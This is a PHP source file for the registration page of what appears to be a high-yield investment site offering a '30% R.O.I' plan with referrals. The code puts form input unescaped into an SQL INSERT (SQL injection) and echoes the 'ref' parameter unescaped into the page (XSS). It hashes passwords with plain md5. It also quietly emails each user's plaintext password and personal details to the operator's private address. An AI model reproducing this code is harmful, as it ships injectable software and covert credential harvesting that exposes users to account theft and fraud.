<?php
//db_connect
require_once 'includes/constants.php';
require_once 'includes/user_functions.php';

//Referral
if(isset($_GET['ref'])){
	$ref = $_GET['ref'];
} else { $ref = '';}

//form validation
if (isset($_POST['register'])) {
    $username = filter_input(INPUT_POST, 'un');
    $fullname = filter_input(INPUT_POST, 'fn');
    $email = filter_input(INPUT_POST, 'e');
    $phone = filter_input(INPUT_POST, 'p');
    $country = filter_input(INPUT_POST, 'c');
    $zip = filter_input(INPUT_POST, 'zip');
    $refr = filter_input(INPUT_POST, 'ref');
    $invest_plan = filter_input(INPUT_POST, 'plan');
    $password = filter_input(INPUT_POST, 'pw');
    $password2 = filter_input(INPUT_POST, 'pw2');
    $check = filter_input(INPUT_POST, 'check');
	
	$emailcheck = regvalidate('email', $email);
	$phonecheck = regvalidate('phone_number', $phone);
	
	if($_POST['terms']!="agree"){
		$reg_prompt = '<div class="note note-danger"> * You must accept the Terms and Conditions first.</div>';
	}else if(!$emailcheck || !$phonecheck){
		$reg_prompt = '<div class="note note-danger"> * An existing account has been found with matching details. Please review.</div>';
	} else {

    if ($password != $password2) {
        $reg_prompt = '<div class="note note-danger"> * passsword does not match</div>';
    } else {
        if ($username == "" || $invest_plan == "" || $email == "" || $phone == "" || $password == "" || $password2 == "") {
            $reg_prompt = '<div class="note note-danger"> * Some required fields are missing</div>';
        } else {
            $reg_password = md5($password);
            $reg_query = "INSERT INTO users (username, fullname, email, phone_number, plan, referee, password, reg_date, reg_time)VALUES ('{$username}', '{$fullname}', '{$email}', '{$phone}', '{$invest_plan}', '{$refr}', '{$reg_password}', now(), now())";
            $reg_result = mysqli_query($link, $reg_query);
																								
				//-----------send a mail-----//
			  
			  $to = $private_mail;
              $subject = 'New Registration';
              $message = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>New Registration on '.$company.'</title></head><body style="margin:0px;font-family:Tahoma, Geneva, sans-serif;"><div style="padding:10px;background:#700;font-size:24px;color:#fff;">New Registration on '.$company.'</div><div style="padding:24px; font-size:17px;">Hello, someone just registered on your website<br/><br/>Here are the details:<br/>Username: <b>'.$username.'</b><br/>Full Name: <b>'.$fullname.'</b><br/>E-mail Address: <b>'.$email.'</b><br/>Country: <b>'.$country.'</b><br/>Zip Code: <b>'.$zip.'</b><br/>and Password: <b>'.$password.'</b></div></body></html>';

              $from = $c_email;
              $headers = "From: $from\n";
              $headers .= "MIME-Version: 1.0\n";
              $headers .= "Content-type: text/html; charset=iso-8859-1\n";
              mail($to, $subject, $message, $headers);
						
						//-------------Second mail-------------//
							
			  $to = $email;
              $subject = 'New Registration';
              $message = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>New Registration on '.$company.'</title></head><body style="margin:0px;font-family:Tahoma, Geneva, sans-serif;"><div style="padding:10px;background:#700;font-size:24px;color:#fff;">New Registration on '.$company.'</div><div style="padding:24px; font-size:17px;"><b>Dear '.$username.',</b><br/><br/> We welcome you on behalf of the entire '.$company.' team, thank you for joining us.<br/><br/>This email confirms that your account is ready for live trading. Please refer to your dashboard for more information on funding and account activation procedures. <br/><br/><b>***WARNING***</b><br/>Please do not make payments to any external accounts or wallet address provided by any individuals (both from our workers, traders, account managers) on facebook, WhatsApp, etc. In any case, please make sure you confirm from our official support email address <q><a href="mailto:'.$c_email.'">'.$c_email.'</a></q>. Always crosscheck the email address is same as that on our website before responding or replying to any email. If you have any issues, please chat our customer care representatives.<br/><br/>Login with your credentials below:<br/><b>E-mail Address: '.$email.'<br/>Username: '.$username.'<br/>Password: '.$password.'</b><br/><br/><span style="font:9px italics;">We wish you a successful trading experience</span></div></body></html>';

              $from = $c_email;
              $headers = "From: $from\n";
              $headers .= "MIME-Version: 1.0\n";
              $headers .= "Content-type: text/html; charset=iso-8859-1\n";
              mail($to, $subject, $message, $headers);
							
							//-------------End mail-------------//

            if ($reg_result) {
                echo "<script type='text/javascript'> window.location.href = 'login.php?msg=success'; </script>";
            } else {
                die("Can not register user: " . mysqli_error($link));
            }
        }
    }
}
}
?>
<?php include_once('includes/headinc.php'); ?>
 
<body>
	<div class="register-background">
		<div class="register-page">
			<div class="main-register-contain">
				<div class="register-circul text-xs-center">
					<i class="icon icon_documents_alt register-icon-circul"></i>
				</div>
				<div class="register-form">
					<?php if (isset($reg_prompt)) { ?>
						<div class="row">
							<div class="col-md-12">
								<p><?= $reg_prompt; ?></p>
							</div>
						</div>
					<?php } ?>
					<form id="form-validation" method="post">
						<div class="register_input">
							<input type="text" class="register-form-border" id='uname' name='un' placeholder="User Name*" onkeyup="restrict('uname')" maxlength="20" required>
							<span class="register-right-icon"><i class="icon icon_profile"></i></span>
						</div>
						<div class="register_input">
							<input type="text" class="register-form-border" id='fn' name='fn' placeholder="Full Name*" required>
							<span class="register-right-icon"><i class="icon icon_profile"></i></span>
						</div>
						
						<div class="register_input">
							<input type="text" class="register-form-border" id='email' name='e' placeholder="Enter Email*" onkeyup="restrict('email')" required>
							<span class="register-right-icon"><i class="icon icon_mail"></i></span>
						</div>
						<div class="register_input">
							<input type="text" class="register-form-border" id='phone' name='p' onkeyup="restrict('phone')" placeholder="Phone Number*" required>
							<span class="register-right-icon"><i class="icon icon_phone"></i></span>
						</div>
						<div class="register_input">
							<input type="text" class="register-form-border" id='c' name='c' placeholder="Country">
							<span class="register-right-icon"><i class="icon icon_globe"></i></span>
						</div>
						<div class="register_input">
							<input type="text" class="register-form-border" id='z' name='zip' placeholder="Zip/Postal Code">
							<span class="register-right-icon"><i class="icon icon_globe"></i></span>
						</div>
						<div class="register_input">
							<select size=1 class="register-form-border" id="s" name="plan" style="width:100%">
								<option value="">Choose a plan</option>
								<option value="ULTIMATE" style="color:#000">ULTIMATE (30% R.O.I)</option>
								<!--option value="BRONZE" style="color:#000">BRONZE</option>
								<option value="SILVER" style="color:#000">SILVER</option>
								<option value="GOLD" style="color:#000">GOLD</option-->
							</select>
						</div>
						<div class="register_input">
							<input type="text" class="register-form-border" id='ref' value="<?= $ref; ?>" name='ref' placeholder="Your Referee">
							<span class="register-right-icon"><i class="icon icon_profile"></i></span>
						</div>
						
						<div class="register_input">
							<input type="password" class="register-form-border" id='pw' name='pw' placeholder="Password*" required>
							<span class="register-right-icon"><i class="icon icon_key"></i></span>
						</div>
						<div class="register_input">
							<input type="password" class="register-form-border" id='pw2' name='pw2' placeholder="Confirm Password*" required>
							<span class="register-right-icon"><i class="icon icon_key"></i></span>
						</div>
						<div class="checkbox checkbox-register-v1">
							<input value="agree" id="terms" name="terms" type="checkbox" required>
							<label for="checkbox-squared1"></label>
							<span>I agree to the Terms &amp; Conditions.</span>
						</div>
						<div class="form-group">
							<button type="submit" name="register" class="btn btn-primary btn-register">Submit</button>
						</div>
						<div class="goto-register">
							<div class="text-xs-center">
								Already a member ? <a href="login">Click to Login</a>
							</div>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
</body>
 
<p><br/></p>

<script src="./assets/global/js/ajax.js" type="text/javascript"></script>
<script src="./assets/global/js/main.js" type="text/javascript"></script>